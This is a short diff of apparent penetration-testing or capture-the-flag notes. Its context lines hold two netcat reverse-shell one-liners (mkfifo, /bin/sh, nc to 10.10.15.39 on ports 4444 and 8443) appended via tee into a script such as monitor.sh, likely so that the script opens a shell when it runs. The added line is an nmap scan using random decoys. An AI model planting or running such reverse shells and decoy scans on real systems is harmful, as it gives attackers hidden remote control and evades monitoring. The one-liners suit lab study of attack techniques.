@@ -7,3 +7,5 @@
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.39 4444 >/tmp/f' | tee -a 
 
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.39 8443 >/tmp/f' | tee -a monitor.sh
+
+nmap -Pn -T4 -A -v -sV 10.10.14.1 -p 53 -D RND:5 --stats-every=5s
